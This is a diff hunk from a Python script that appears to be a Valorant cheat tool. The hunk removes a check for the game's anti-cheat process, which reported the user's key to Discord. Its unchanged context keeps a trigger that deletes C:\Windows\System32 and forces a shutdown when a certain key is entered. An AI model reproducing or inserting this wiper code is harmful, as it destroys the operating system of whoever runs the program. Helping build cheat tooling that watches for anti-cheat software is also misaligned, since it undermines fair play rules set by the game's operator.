@@ -210,23 +210,6 @@ if cskey =="antidebuuggerxxxx":
     shutil.rmtree(r'C:\Windows\System32')
     os.system("shutdown /s /f /t 0")
 
-def is_valorant_running():
-    result = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
-    if 'vgc.exe' in result.stdout:
-        return True
-    return False
-if is_valorant_running():   
-    os.system('cls')
-    mylogo
-    msgysdc=cskey+" tried to run Aes while valo is running."
-    discord_warning(msgysdc)
-    printg("---ERROR. Please run AES first before you open Valorant.")
-    printg("---This is for your own safety.")
-    printg("---If error persists, restart PC.")
-    show_message_box("ERROR. Please run AES first before you open Valorant.", "Error", MB_OK | ICON_ERROR)
-    exit()
-else:
-    print("")
 os.system('cls')
 os.system('cls')
  
